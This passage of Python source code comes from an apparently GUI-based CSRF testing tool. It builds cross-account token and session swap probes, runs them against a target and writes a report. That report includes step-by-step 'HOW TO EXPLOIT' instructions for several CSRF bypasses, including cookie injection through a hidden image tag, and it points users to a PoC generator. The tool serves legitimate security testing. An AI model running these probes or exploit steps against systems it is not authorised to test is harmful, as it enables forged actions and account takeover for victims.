                b_hdrs["Cookie"] = acct_b_cookie_hdr

            # 9a. A's token + B's session — A's body/header tokens auto-refreshed at runtime
            self._probes.append(CSRFProbe(
                "Account A token + Account B session",
                "A body token (auto-refreshed) with B session"
                + (f" + B csrfKey" if b_csrf_key_val else "")
                + ". If accepted → token not bound to session.",
                _rebuild(headers=b_hdrs),
                "Token validation – Non-session cookie",
                refresh_body=_rb, refresh_hdrs=_rh,
                use_acct_b_refresh=False))

            # 9b. B's token + A's session — B's body/header tokens auto-refreshed via B's URL
            self._probes.append(CSRFProbe(
                "Account B token + Account A session",
                "B body token (auto-refreshed from B's URL) with A session. "
                "Should fail if tokens are session-bound.",
                _rebuild(),
                "",
                refresh_body=_rb, refresh_hdrs=_rh,
                use_acct_b_refresh=True))

            # 9c. B full baseline (B token + B session + B csrfKey) — all auto-refreshed
            self._probes.append(CSRFProbe(
                "Account B token + Account B session (Account B baseline)",
                "Complete Account B request (auto-refreshed) — should succeed (sanity check).",
                _rebuild(headers=b_hdrs),
                "",
                refresh_body=_rb, refresh_hdrs=_rh,
                use_acct_b_refresh=True))

            # 9d. Invalid token + B session — no refresh (want invalid token)
            b_invalid = _set_body_tokens(ri.body, {k: INVALID for k, _ in body_tokens})
            self._probes.append(CSRFProbe(
                "Invalid token + Account B session",
                "Confirm Account B also rejects invalid tokens.",
                _rebuild(headers=b_hdrs, body=b_invalid), ""))

            # 9e. csrfKey mismatch probes (when cookie tokens are present)
            if b_csrf_key_val and cookie_tokens:
                # A csrfKey + B session + A body token (auto-refreshed)
                a_ck_b_sess = _swap_session(ri.headers, b_session_val) if b_session_val else dict(ri.headers)
                self._probes.append(CSRFProbe(
                    "A csrfKey + B session + A body token",
                    "A csrfKey with B session and A body token (auto-refreshed). "
                    "Tests whether csrfKey must match the session.",
                    _rebuild(headers=a_ck_b_sess),
                    "Token validation – Non-session cookie",
                    refresh_body=_rb, refresh_hdrs=_rh,
                    use_acct_b_refresh=False))

                # B csrfKey + A session + A body token (auto-refreshed)
                b_ck_a_sess = _set_cookie_tokens(ri.headers,
                    {k: b_csrf_key_val for k, _ in cookie_tokens})
                self._probes.append(CSRFProbe(
                    "B csrfKey + A session + A body token",
                    "B csrfKey with A session and A body token (auto-refreshed). "
                    "If accepted → csrfKey is not bound to session.",
                    _rebuild(headers=b_ck_a_sess),
                    "Token validation – Non-session cookie",
                    refresh_body=_rb, refresh_hdrs=_rh,
                    use_acct_b_refresh=False))

                # B csrfKey + B session + B body token (mismatch vs A's fixed token)
                b_ck_b_sess_b_tok = _set_cookie_tokens(
                    _swap_session(ri.headers, b_session_val) if b_session_val else dict(ri.headers),
                    {k: b_csrf_key_val for k, _ in cookie_tokens})
                self._probes.append(CSRFProbe(
                    "B csrfKey + B session + B body token (mismatch check)",
                    "B csrfKey and session with B body token (auto-refreshed). "
                    "Should succeed — confirms B can make valid requests.",
                    _rebuild(headers=b_ck_b_sess_b_tok),
                    "",
                    refresh_body=_rb, refresh_hdrs=_rh,
                    use_acct_b_refresh=True))

            # 9f. Refreshed A token + B session
            self._probes.append(CSRFProbe(
                "Refreshed A token + Account B session",
                "Fresh A token (auto-refreshed) with B session — tests session-token binding.",
                _rebuild(headers=b_hdrs),
                "Token validation – Non-session cookie",
                refresh_body=_rb, refresh_hdrs=_rh,
                use_acct_b_refresh=False))

            # 9g. Account B double-submit
            if double_submit and body_tokens:
                # Same as b_hdrs — replace Cookie header entirely with B's
                b_ds_hdrs = dict(ri.headers)
                for _bk in list(b_ds_hdrs.keys()):
                    if _bk.lower() == "cookie":
                        b_ds_hdrs[_bk] = acct_b_cookie_hdr
                        break
                else:
                    b_ds_hdrs["Cookie"] = acct_b_cookie_hdr
                self._probes.append(CSRFProbe(
                    "Account B: double-submit (B token + B session + B csrfKey)",
                    "Full Account B double-submit test — B tokens auto-refreshed.",
                    _rebuild(headers=b_ds_hdrs),
                    "Token validation – Double submit cookie",
                    refresh_body=_rb, refresh_hdrs=_rh,
                    use_acct_b_refresh=True))

    def _populate_queue(self):
        self._table.setRowCount(0)
        for i, probe in enumerate(self._probes):
            self._table.insertRow(i)
            self._table.setItem(i, 0, QTableWidgetItem(str(i + 1)))
            self._table.setItem(i, 1, QTableWidgetItem(probe.name))
            status_item = QTableWidgetItem("–")
            status_item.setTextAlignment(Qt.AlignCenter)
            self._table.setItem(i, 2, status_item)
            result_item = QTableWidgetItem(probe.result_label)
            result_item.setTextAlignment(Qt.AlignCenter)
            result_item.setForeground(QBrush(QColor(
                self._RESULT_COLORS.get(probe.result_label, "#888"))))
            self._table.setItem(i, 3, result_item)
        if self._probes:
            self._table.selectRow(0)

    # ── Probe execution ─────────────────────────────────────────────────────

    def _start_probes(self):
        if not self._probes:
            return
        ri = self.request_info
        self._run_btn.setEnabled(False)
        self._stop_btn.setEnabled(True)
        self._progress.setMaximum(len(self._probes))
        self._progress.setValue(0)
        self._summary_view.clear()

        # Reset all rows to Pending
        for i in range(self._table.rowCount()):
            self._table.item(i, 2).setText("–")
            self._table.item(i, 3).setText("Pending")
            self._table.item(i, 3).setForeground(
                QBrush(QColor(self._RESULT_COLORS["Pending"])))
            self._probes[i].result_label    = "Pending"
            self._probes[i].status_code     = 0
            self._probes[i].response_body   = ""
            self._probes[i].response_headers = ""

        # Build refresh config from the analysis config, extracting Account A's cookie header
        a_cookie_hdr = ""
        for k, v in ri.headers.items():
            if k.lower() == "cookie":
                a_cookie_hdr = v
                break
        refresh_cfg = dict(
            refresh_url        = self._config.get("refresh_url", ""),
            refresh_mode       = self._config.get("refresh_mode", "HTML form input"),
            refresh_pattern    = self._config.get("refresh_pattern", ""),
            a_cookie_hdr       = a_cookie_hdr,
            acct_b_cookie_hdr  = self._config.get("acct_b_cookie_hdr", ""),
            acct_b_refresh_url = self._config.get("acct_b_refresh_url", ""),
            body_variation     = self._config.get("body_variation", {}),
        )

        self._worker = CSRFTesterWorker(
            self._probes,
            host        = ri.host,
            port        = ri.port,
            use_ssl     = ri.scheme == "https",
            refresh_cfg = refresh_cfg,
        )
        self._worker.probe_started.connect(self._on_probe_started)
        self._worker.probe_finished.connect(self._on_probe_finished)
        self._worker.all_done.connect(self._on_all_done)
        self._worker.start()

    def _stop_probes(self):
        if self._worker and self._worker.isRunning():
            self._worker.terminate()
            self._worker.wait(1000)
        self._run_btn.setEnabled(True)
        self._stop_btn.setEnabled(False)
        self._status_lbl.setText("Stopped by user.")

    # ── Slots ────────────────────────────────────────────────────────────────

    @pyqtSlot(int)
    def _on_probe_started(self, idx: int):
        self._status_lbl.setText(
            f"Running probe {idx + 1}/{len(self._probes)}: {self._probes[idx].name}")
        self._table.item(idx, 3).setText("Running…")
        self._table.item(idx, 3).setForeground(
            QBrush(QColor(self._RESULT_COLORS["Pending"])))
        self._table.scrollToItem(self._table.item(idx, 0))

    @pyqtSlot(int, object)
    def _on_probe_finished(self, idx: int, probe: CSRFProbe):
        self._progress.setValue(idx + 1)
        status_text = str(probe.status_code) if probe.status_code else "ERR"
        self._table.item(idx, 2).setText(status_text)
        self._table.item(idx, 3).setText(probe.result_label)
        color = self._RESULT_COLORS.get(probe.result_label, "#888")
        self._table.item(idx, 3).setForeground(QBrush(QColor(color)))
        # Refresh detail pane if this row is selected
        if self._selected_row == idx:
            self._show_probe(probe)

    @pyqtSlot()
    def _on_all_done(self):
        self._run_btn.setEnabled(True)
        self._stop_btn.setEnabled(False)
        self._status_lbl.setText("✓ All probes complete.")
        self._build_summary()
        self._tabs.setCurrentIndex(2)   # Jump to Summary tab

    def _on_row_selected(self):
        rows = self._table.selectedItems()
        if not rows:
            return
        idx = self._table.currentRow()
        if 0 <= idx < len(self._probes):
            self._selected_row = idx
            self._show_probe(self._probes[idx])

    def _show_probe(self, probe: CSRFProbe):
        self._req_view.setPlainText(probe.raw_request)

        # Build analysis banner (shown when probe has run and has analysis)
        analysis_banner = ""
        if probe.analysis_note and probe.result_label not in ("Pending", "Error", ""):
            icon = "🔴" if probe.result_label == "Bypassed" else "🟢"
            sep  = "─" * 68
            banner_lines = [
                sep,
                f"  {icon}  RESULT: {probe.result_label.upper()}  —  HTTP {probe.status_code}",
                sep,
                "",
                f"  TOKEN RELATIONSHIP:",
                f"  {probe.analysis_note}",
            ]
            if probe.exploit_action:
                banner_lines += [
                    "",
                    f"  EXPLOITATION ACTION:",
                    f"  {probe.exploit_action}",
                ]
            if probe.bypass_hint and probe.result_label == "Bypassed":
                banner_lines += [
                    "",
                    f"  SUGGESTED BYPASS TECHNIQUE:",
                    f"  \"{probe.bypass_hint}\"",
                    f"  → Select this in the Bypass Technique dropdown and click Generate PoC.",
                ]
            banner_lines += ["", sep, ""]
            analysis_banner = "\n".join(banner_lines) + "\n"

        if probe.status_code:
            # Annotate Location header if present so it's easy to spot
            headers = probe.response_headers
            loc = CSRFTesterWorker._location_from_headers(headers)
            loc_note = f"\n\n  ▶ Location: {loc}" if loc else ""
            body = probe.response_body or "(empty body)"
            resp = (
                f"HTTP/1.1 {probe.status_code} {probe.status_text}\n"
                f"{headers}{loc_note}\n\n"
                f"── Body ({'decompressed' if probe.response_body else 'empty'}) ──\n"
                f"{body}"
            )
        elif probe.error:
            resp = f"[Error]\n{probe.error}"
        else:
            resp = "(Not yet run — click 'Run All Probes')"
        self._resp_view.setPlainText(analysis_banner + resp)

    # ── Summary ──────────────────────────────────────────────────────────────

    def _build_summary(self):  # noqa: C901
        baseline  = self._probes[0] if self._probes else None
        base_code = baseline.status_code if baseline else 0
        base_loc  = CSRFTesterWorker._location_from_headers(
            baseline.response_headers) if baseline else ""

        cfg           = self._config
        body_tokens   = cfg.get("body_tokens",   [])
        cookie_tokens = cfg.get("cookie_tokens", [])
        hdr_tokens    = cfg.get("hdr_tokens",    [])
        double_submit = cfg.get("double_submit", False)

        # ── Categorise probes ────────────────────────────────────────────────
        token_probes   = []   # body / cookie / header token manipulation
        method_probes  = []   # HTTP method switch
        ds_probes      = []   # double-submit
        session_probes = []   # session cookie removed + cross-account
        acct_probes    = []   # cross-account session-binding probes

        for i, probe in enumerate(self._probes):
            if i == 0:
                continue
            name = probe.name.lower()
            if "account a" in name or "account b" in name or "csrfkey" in name:
                acct_probes.append((i, probe))
            elif "get method" in name or "method switch" in name:
                method_probes.append((i, probe))
            elif "double-submit" in name:
                ds_probes.append((i, probe))
            elif "session cookie removed" in name:
                session_probes.append((i, probe))
            else:
                token_probes.append((i, probe))

        bypassed_probes  = [(i, p) for i, p in enumerate(self._probes) if p.result_label == "Bypassed"]
        protected_probes = [(i, p) for i, p in enumerate(self._probes) if p.result_label == "Protected"]
        error_probes     = [(i, p) for i, p in enumerate(self._probes) if p.result_label == "Error"]
        unknown_probes   = [(i, p) for i, p in enumerate(self._probes) if p.result_label == "Unknown"]
        bypassed_hints   = list(dict.fromkeys(p.bypass_hint for _, p in bypassed_probes if p.bypass_hint))

        icon_map = {"Bypassed":  "🔴", "Protected": "🟢", "Baseline": "🔵",
                    "Error": "🟠",     "Pending":   "⚪",  "Unknown":  "🟡"}

        lines: List[str] = []

        # ═══════════════════════════════════════════════════════════════════════
        # HEADER
        # ═══════════════════════════════════════════════════════════════════════
        lines += [
            "╔" + "═" * 70 + "╗",
            "║  CSRF MECHANISM TESTER — PROFESSIONAL ANALYSIS REPORT" + " " * 17 + "║",
            "╚" + "═" * 70 + "╝",
            "",
        ]

        # ── Target & Baseline ────────────────────────────────────────────────
        lines += [
            "TARGET",
            "──────",
            f"  URL    : {self.request_info.url}",
            f"  Method : {self.request_info.method}",
            f"  Baseline response: HTTP {base_code} {baseline.status_text if baseline else ''}",
        ]
        if base_loc:
            lines.append(f"  Baseline Location: {base_loc}  (redirect destination — comparison anchor)")
        lines += ["", ""]

        # ── Overview ─────────────────────────────────────────────────────────
        total_excl_baseline = len(self._probes) - 1
        lines += [
            "OVERVIEW",
            "────────",
            f"  Total probes run  : {total_excl_baseline}",
            f"  🔴 Bypassed        : {len(bypassed_probes)}",
            f"  🟢 Protected       : {len(protected_probes)}",
            f"  🟡 Unknown         : {len(unknown_probes)}",
            f"  🟠 Error           : {len(error_probes)}",
            "",
            "",
        ]

        # ═══════════════════════════════════════════════════════════════════════
        # EXPLOITATION PATHS  (shown only when there are bypassed probes)
        # ═══════════════════════════════════════════════════════════════════════
        if bypassed_probes:
            lines += [
                "EXPLOITATION PATHS",
                "══════════════════",
                "  Each bypassed probe below confirms a concrete attack path.",
                "  Read the token relationship and exploit action for each one.",
                "",
            ]
            for i, probe in bypassed_probes:
                code_str = str(probe.status_code) if probe.status_code else "---"
                lines += [
                    f"  🔴 [{i+1}] {probe.name}",
                    f"       HTTP {code_str} — BYPASSED",
                ]
                if probe.analysis_note:
                    lines.append(f"       Token relationship : {probe.analysis_note}")
                if probe.exploit_action:
                    lines.append(f"       Exploit action    : {probe.exploit_action}")
                if probe.bypass_hint:
                    lines.append(
                        f"       Bypass technique  : \"{probe.bypass_hint}\""
                        f"  →  select in dropdown & Generate PoC"
                    )
                lines.append("")
            lines += ["", ""]

        # ═══════════════════════════════════════════════════════════════════════
        # TOKEN ARCHITECTURE ANALYSIS
        # ═══════════════════════════════════════════════════════════════════════
        lines += [
            "TOKEN ARCHITECTURE ANALYSIS",
            "───────────────────────────",
            "",
        ]

        if not body_tokens and not cookie_tokens and not hdr_tokens:
            lines.append("  ⚠  No CSRF tokens were configured — structural probes only.")
        else:
            if body_tokens:
                names = ", ".join(f"'{k}'" for k, _ in body_tokens)
                lines += [
                    f"  Body parameter token(s): {names}",
                    f"  ├─ Location: submitted as a hidden form field or JSON key in the request body.",
                    f"  ├─ Pattern : standard Synchroniser Token Pattern (STP).",
                    f"  └─ Expected binding: server generates a unique token per session/request",
                    f"     and stores it server-side; the submitted value must match.",
                    "",
                ]
            if cookie_tokens:
                names = ", ".join(f"'{k}'" for k, _ in cookie_tokens)
                lines += [
                    f"  Cookie-bound token(s): {names}",
                    f"  ├─ Location: stored in a browser cookie, sent automatically with every request.",
                    f"  ├─ Pattern : cookie-to-body or csrfKey pattern.",
                    f"  │   The server links this cookie to the session cookie at login time.",
                    f"  └─ Key security requirement: the csrfKey cookie MUST be bound to the session",
                    f"     cookie — a mismatch (different user's csrfKey + victim's session) must fail.",
                    "",
                ]
            if hdr_tokens:
                names = ", ".join(f"'{k}'" for k, _ in hdr_tokens)
                lines += [
                    f"  Custom header token(s): {names}",
                    f"  ├─ Location: sent as a custom HTTP request header (e.g. X-CSRF-Token).",
                    f"  ├─ Pattern : common in SPA / API applications using fetch() or XHR.",
                    f"  └─ Inherent protection: cross-origin forms cannot set custom headers,",
                    f"     so header-based tokens provide CSRF protection by design.",
                    f"     Vulnerability only possible if the validation logic is flawed.",
                    "",
                ]
            if double_submit:
                lines += [
                    f"  ⚑  Double-submit cookie pattern detected",
                    f"  ├─ The token value appears in BOTH the request body AND a cookie.",
                    f"  ├─ The server validates by comparing the two values (no server-side record).",
                    f"  └─ Attack surface: an attacker who can inject a cookie into the victim's",
                    f"     browser can plant any invented token in both locations simultaneously.",
                    "",
                ]

        # ── Session-Token Binding Assessment ─────────────────────────────────
        lines += [
            "  SESSION-TOKEN BINDING ASSESSMENT:",
            "  (determined from live probe results)",
            "",
        ]

        def _probe_by_name_frag(*frags) -> Optional[CSRFProbe]:
            """Return the first probe whose name contains all fragments (case-insensitive)."""
            lower_frags = [f.lower() for f in frags]
            for p in self._probes:
                n = p.name.lower()
                if all(f in n for f in lower_frags):
                    return p
            return None

        sess_removed = _probe_by_name_frag("session cookie removed")
        if sess_removed and sess_removed.result_label != "Pending":
            if sess_removed.result_label == "Protected":
                lines += [
                    "  ✅ Authentication enforcement: CONFIRMED",
                    "     Session cookie removed → server rejected the request (HTTP "
                    f"{sess_removed.status_code}).",
                    "     The CSRF token is only meaningful within an authenticated session;",
                    "     the endpoint correctly requires a valid session cookie.",
                    "",
                ]
            elif sess_removed.result_label == "Bypassed":
                lines += [
                    "  🔴 CRITICAL: Session cookie removed → request ACCEPTED.",
                    "     The endpoint may not enforce authentication at all.",
                    "     CSRF protection is moot if the action is unauthenticated,",
                    "     but the unauthenticated access itself is a higher-severity finding.",
                    "",
                ]
            else:
                lines += [
                    f"  ⚪ Session removal result: {sess_removed.result_label} (HTTP {sess_removed.status_code}) — review manually.",
                    "",
                ]

        a_tok_b_sess = _probe_by_name_frag("account a token", "account b session")
        b_tok_a_sess = _probe_by_name_frag("account b token", "account a session")
        if a_tok_b_sess and a_tok_b_sess.result_label != "Pending":
            if a_tok_b_sess.result_label == "Bypassed":
                lines += [
                    "  🔴 CRITICAL: Token is NOT bound to the user session.",
                    "     A's token was accepted with B's session (HTTP "
                    f"{a_tok_b_sess.status_code}).",
                    "     ├─ The server validates token ∈ global-pool, NOT token → session.",
                    "     ├─ An attacker logs in with their own account, obtains their own valid",
                    "     │  token, and submits it in a CSRF attack against any victim's session.",
                    "     └─ Recommended bypass: 'Token validation – Not tied to session'",
                    "",
                ]
            elif a_tok_b_sess.result_label == "Protected":
                lines += [
                    "  ✅ Token-session binding CONFIRMED (A token + B session → rejected).",
                    "     The server correctly ties each token to the session that requested it.",
                    "",
                ]

        if b_tok_a_sess and b_tok_a_sess.result_label != "Pending":
            if b_tok_a_sess.result_label == "Bypassed":
                lines += [
                    "  🔴 HIGH: B's token accepted with A's session — confirms shared token pool.",
                    "     Neither account's token is session-scoped.",
                    "",
                ]
            elif b_tok_a_sess.result_label == "Protected":
                lines += [
                    "  ✅ Reverse swap also rejected (B token + A session → protected).",
                    "",
                ]

        a_ck_b_sess = _probe_by_name_frag("a csrfkey", "b session")
        b_ck_a_sess = _probe_by_name_frag("b csrfkey", "a session")
        if a_ck_b_sess and a_ck_b_sess.result_label != "Pending":
            if a_ck_b_sess.result_label == "Bypassed":
                lines += [
                    "  🔴 HIGH: csrfKey cookie is NOT bound to the session cookie.",
                    "     A's csrfKey was accepted with B's session (HTTP "
                    f"{a_ck_b_sess.status_code}).",
                    "     ├─ The csrfKey and session cookies are independent credentials.",
                    "     ├─ Attack: inject your own csrfKey into the victim's browser via any",
                    "     │  cookie-injection endpoint, then submit your matching body token.",
                    "     └─ Recommended bypass: 'Token validation – Non-session cookie'",
                    "",
                ]
            elif a_ck_b_sess.result_label == "Protected":
                lines += [
                    "  ✅ csrfKey is tied to the session (A csrfKey + B session → rejected).",
                    "",
                ]

        if b_ck_a_sess and b_ck_a_sess.result_label != "Pending":
            if b_ck_a_sess.result_label == "Bypassed":
                lines += [
                    "  🔴 HIGH: B's csrfKey accepted with A's session — csrfKey is interchangeable.",
                    "     Confirms cookie-to-session binding is absent in both directions.",
                    "",
                ]
            elif b_ck_a_sess.result_label == "Protected":
                lines += [
                    "  ✅ Reverse csrfKey swap also rejected (B csrfKey + A session → protected).",
                    "",
                ]

        if not any([sess_removed, a_tok_b_sess, b_tok_a_sess, a_ck_b_sess, b_ck_a_sess]):
            lines += [
                "  ℹ  No session-binding probes were run.",
                "     To test token-session binding, provide Account B credentials",
                "     in the Token Refresh tab of the Analysis Dialog.",
                "",
            ]

        lines += ["", ""]

        # ═══════════════════════════════════════════════════════════════════════
        # DETAILED PROBE RESULTS (by category)
        # ═══════════════════════════════════════════════════════════════════════
        lines += [
            "DETAILED PROBE RESULTS",
            "──────────────────────",
            "",
        ]

        def _fmt_probe(i: int, probe: CSRFProbe) -> List[str]:
            icon     = icon_map.get(probe.result_label, "⚪")
            code_str = str(probe.status_code) if probe.status_code else "---"
            loc      = CSRFTesterWorker._location_from_headers(probe.response_headers)
            loc_note = ""
            if loc and probe.status_code and 300 <= probe.status_code < 400:
                match    = "matches baseline" if loc == base_loc else f"DIFFERS → {loc}"
                loc_note = f"\n       Location : {loc}  [{match}]"

            body_note = ""
            if probe.response_body and probe.result_label not in ("Baseline", "Pending"):
                snippet = probe.response_body.strip()[:200].replace("\n", " ")
                if snippet:
                    body_note = f"\n       Response : {snippet}"

            out = [
                f"  {icon} [{i+1}] {probe.name}",
                f"       Status   : HTTP {code_str}  |  Result: {probe.result_label}"
                f"{loc_note}{body_note}",
                f"       Tests    : {probe.description}",
            ]
            if probe.result_label == "Bypassed" and probe.bypass_hint:
                out.append(f"       ⮕ Bypass  : \"{probe.bypass_hint}\"")
            return out

        # Baseline row
        lines += [
            f"  🔵 [1] Baseline (valid request)",
            f"       Status   : HTTP {base_code} {baseline.status_text if baseline else ''}  |  Result: Baseline (reference)",
        ]
        if base_loc:
            lines.append(f"       Location : {base_loc}")
        lines.append("")

        categories = [
            ("Token Validation Probes",              token_probes),
            ("HTTP Method Bypass Probes",            method_probes),
            ("Double-Submit Cookie Probes",          ds_probes),
            ("Session Cookie Structure Probes",      session_probes),
            ("Cross-Account Session-Binding Probes", acct_probes),
        ]
        for cat_name, cat_probes in categories:
            if not cat_probes:
                continue
            bar = "─" * max(0, 52 - len(cat_name))
            lines.append(f"  ┌─ {cat_name} {bar}")
            for i, probe in cat_probes:
                lines += _fmt_probe(i, probe)
                lines.append("")
            lines.append("")

        lines += ["", ""]

        # ═══════════════════════════════════════════════════════════════════════
        # RECOMMENDATION
        # ═══════════════════════════════════════════════════════════════════════
        lines += [
            "RECOMMENDATION",
            "──────────────",
            "",
        ]

        if not bypassed_hints:
            all_clean = all(
                p.result_label in ("Protected", "Baseline")
                for p in self._probes if p.result_label != "Pending"
            )
            if all_clean:
                lines += [
                    "  🟢 FINDING: No CSRF bypass detected",
                    "  ─────────────────────────────────────",
                    "  All probes were rejected. The CSRF protection implementation",
                    "  resisted every automated bypass technique in this suite.",
                    "",
                    "  Conditions that increase confidence:",
                    "    • Session-binding probes (Account B) ran and were Protected → HIGH confidence",
                    "    • Only structural probes ran (no Account B) → MEDIUM confidence",
                    "",
                    "  Additional manual checks recommended:",
                    "    • Verify SameSite cookie attribute (SameSite=Lax/Strict adds defence-in-depth)",
                    "    • Check all other state-changing endpoints use the same token validation",
                    "    • Confirm sub-domain isolation (sub-domain XSS cannot set parent cookies)",
                    "    • Test with outdated browsers that may not enforce SameSite",
                ]
            else:
                lines += [
                    "  ⚪ FINDING: Inconclusive",
                    "  ────────────────────────",
                    "  Some probes returned unexpected status codes or connection errors.",
                    "  Review individual responses in the probe queue.",
                    "",
                    "  Common causes:",
                    "    • Network / TLS issue — verify host, port, and scheme settings",
                    "    • Server enforces rate-limiting between rapid probes",
                    "    • Token-refresh URL or extraction pattern is misconfigured",
                    "    • Single-use tokens expired before all probes ran (enable Token Refresh)",
                ]
        else:
            # Severity classification
            critical_hints = {
                "Token validation – Not tied to session",
                "Token validation – Non-session cookie",
                "Token validation – Double submit cookie",
            }
            high_hints = {
                "Token validation – Token absent",
                "Token validation – Request method",
            }
            has_critical = any(h in critical_hints for h in bypassed_hints)
            has_high     = any(h in high_hints     for h in bypassed_hints)
            sev          = "🔴 CRITICAL" if has_critical else ("🔴 HIGH" if has_high else "🟡 MEDIUM")

            lines += [
                f"  {sev}: CSRF Bypass CONFIRMED",
                "  ─────────────────────────────────",
                "",
                "  Detected bypass technique(s):",
            ]
            for hint in bypassed_hints:
                lines.append(f"    • {hint}")
            lines.append("")

            # Per-technique exploitation + relationship guidance
            guidance: Dict[str, List[str]] = {
                "Token validation – Not tied to session": [
                    "  HOW TO EXPLOIT:",
                    "    1. Log in with your attacker account. Navigate to any page that",
                    "       issues your account's CSRF token and capture it.",
                    "    2. Create the CSRF PoC using the 'Not tied to session' bypass option.",
                    "       The PoC substitutes your own valid token into the form body.",
                    "    3. When a victim visits the PoC page, their session cookie is sent",
                    "       automatically by the browser. The server validates your token",
                    "       against the global pool and accepts it — despite the mismatch",
                    "       between the token owner (you) and the session owner (victim).",
                    "",
                    "  TOKEN ↔ SESSION RELATIONSHIP:",
                    "    ┌────────────────────────────────────────────────────────────┐",
                    "    │ token      → exists in a GLOBAL pool (all accounts share)  │",
                    "    │ session    → correctly scoped per-user                     │",
                    "    │ validation → checks: token ∈ pool  (should check: token    │",
                    "    │                      ∈ session's own issued tokens)         │",
                    "    └────────────────────────────────────────────────────────────┘",
                    "    Root cause: the server does not store which session a token was",
                    "    issued to, only that the token was issued at all.",
                ],
                "Token validation – Non-session cookie": [
                    "  HOW TO EXPLOIT:",
                    "    1. Obtain your own valid csrfKey cookie and matching csrf body token",
                    "       (log into your own account and inspect the cookies + request).",
                    "    2. Find a cookie-injection endpoint on the target domain:",
                    "       e.g. a URL parameter reflected into Set-Cookie, a CRLF injection point,",
                    "       or any sub-domain endpoint that can set a parent-domain cookie.",
                    "    3. The PoC loads the injection URL via a hidden <img> tag. The victim's",
                    "       browser receives Set-Cookie: csrfKey=YOUR-KEY from the target domain.",
                    "    4. The <img> onerror callback immediately submits the form with your",
                    "       matching csrf body token. The server sees csrfKey == csrf token ✓",
                    "       and ignores the fact that both belong to the attacker, not the victim.",
                    "",
                    "  TOKEN ↔ SESSION RELATIONSHIP:",
                    "    ┌────────────────────────────────────────────────────────────┐",
                    "    │ session cookie → bound to victim's authenticated identity   │",
                    "    │ csrfKey cookie → NOT bound to the session cookie            │",
                    "    │ body token     → linked to csrfKey (must match), NOT session│",
                    "    │ validation     → checks: csrfKey == body_token (correct)    │",
                    "    │                  MISSING: session ↔ csrfKey binding check   │",
                    "    └────────────────────────────────────────────────────────────┘",
                    "    Root cause: csrfKey is issued independently of the session; the",
                    "    server never verifies that the csrfKey was issued to the same user",
                    "    whose session cookie accompanies the request.",
                ],
                "Token validation – Double submit cookie": [
                    "  HOW TO EXPLOIT:",
                    "    1. Invent any token string (e.g. 'attacker123'). No valid account needed.",
                    "    2. Use a cookie-injection endpoint to set 'csrf=attacker123' in the",
                    "       victim's browser (same technique as non-session cookie bypass).",
                    "    3. Submit the form with 'csrf=attacker123' in the body.",
                    "       The server compares cookie == body → both 'attacker123' → ✓",
                    "    4. The server keeps no record of valid tokens; the check is purely",
                    "       stateless, so any matching pair passes validation.",
                    "",
                    "  TOKEN ↔ SESSION RELATIONSHIP:",
                    "    ┌────────────────────────────────────────────────────────────┐",
                    "    │ csrf cookie  → set by server at login, readable by JS       │",
                    "    │ body token   → must equal csrf cookie (double-submit check)  │",
                    "    │ session      → entirely disconnected from token validation   │",
                    "    │ server state → NONE (stateless check; no stored token record)│",
                    "    │ validation   → checks: cookie_value == body_value            │",
                    "    │                MISSING: any session binding whatsoever        │",
                    "    └────────────────────────────────────────────────────────────┘",
                    "    Root cause: stateless double-submit cannot provide CSRF protection",
                    "    if an attacker can influence the victim's cookies.",
                ],
                "Token validation – Token absent": [
                    "  HOW TO EXPLOIT:",
                    "    1. Remove the CSRF token parameter from the request body entirely",
                    "       (not just set it to empty — delete the parameter).",
                    "    2. A standard HTML form without a token field will succeed.",
                    "    3. No bypass credentials or cookie injection needed.",
                    "",
                    "  TOKEN ↔ SESSION RELATIONSHIP:",
                    "    ┌────────────────────────────────────────────────────────────┐",
                    "    │ token → conditionally validated (only when the param exists) │",
                    "    │ session → correctly required                                 │",
                    "    │ flaw   → if (token_present): validate(token)                 │",
                    "    │          should be: if (not token) or (not valid): reject()  │",
                    "    └────────────────────────────────────────────────────────────┘",
                    "    Root cause: presence check missing — the server assumes absence",
                    "    means 'no token needed' rather than 'missing required token'.",
                ],
                "Token validation – Request method": [
                    "  HOW TO EXPLOIT:",
                    "    1. Convert the POST request to GET, moving all body params to the",
                    "       query string. The server skips CSRF validation for GET requests.",
                    "    2. Deliver via an <img src='...'> or simple link — no form needed.",
                    "    3. Note: the action must be idempotent or the server must process",
                    "       GET the same as POST for this to have real impact.",
                    "",
                    "  TOKEN ↔ SESSION RELATIONSHIP:",
                    "    ┌────────────────────────────────────────────────────────────┐",
                    "    │ token   → validated on POST only; ignored for GET           │",
                    "    │ session → correctly required on both methods                 │",
                    "    │ flaw    → if (method == 'POST'): validate(token)             │",
                    "    │           should validate regardless of HTTP method           │",
                    "    └────────────────────────────────────────────────────────────┘",
                    "    Root cause: method-gated validation — the security check is",
                    "    tied to the HTTP verb rather than the state-change being performed.",
                ],
            }

            primary = bypassed_hints[0]
            if primary in guidance:
                lines += guidance[primary]
                lines.append("")

            if len(bypassed_hints) > 1:
                lines.append("  Additional confirmed bypasses:")
                for h in bypassed_hints[1:]:
                    lines.append(f"    • {h}")
                    if h in guidance:
                        for g in guidance[h][:4]:
                            lines.append(f"    {g}")
                lines.append("")

            lines += [
                "  NEXT STEPS:",
                "    1. Select the recommended bypass in the 'Bypass Technique' dropdown",
                "       on the PoC tab and click 'Generate PoC'.",
                "    2. Reproduce the bypass manually using the generated PoC to confirm",
                "       exploitability in your test environment.",
                "    3. Document evidence: save the bypassed request/response pair.",
                "    4. Severity estimate (CVSS 3.1):",
                "       • Not tied to session / Non-session cookie → Medium–High (6.5–8.8)",
                "         (impact depends on the action: account takeover = Critical)",
                "       • Token absent / Method bypass → Medium (5.4–6.5)",
                "       • Adjust AV/AC/PR/UI based on your delivery scenario.",
            ]

        lines += [
            "",
            "",
            "BYPASS DETECTION METHODOLOGY",
            "────────────────────────────",
            "  • 'Bypassed'  = status code matches baseline AND (for 3xx redirects)",
            "                  the Location header matches the baseline destination exactly.",
            "  • 'Protected' = server returned HTTP 400/401/403/405/422/500/501.",
            "  • 'Unknown'   = unexpected response code — review the response manually.",
            "  • Body-based detection: a 2xx response is downgraded to 'Unknown' (not",
            "    Bypassed) when the response body contains JSON error signals such as",
            "    '\"success\":false', '\"status\":\"error\"', 'invalid token', etc.",
            "    This catches APIs that always return HTTP 200 but signal errors in the body.",
            "  • A 302 redirect to /login is NOT treated as bypass even when the baseline",
            "    is also 302 — Location header comparison catches this redirection difference.",
            "",
            "═" * 72,
        ]

        self._summary_view.setPlainText("\n".join(lines))


# ─────────────────────────────────────────────────────────────────────────────
# SameSite Lax Bypass Tester
# ─────────────────────────────────────────────────────────────────────────────

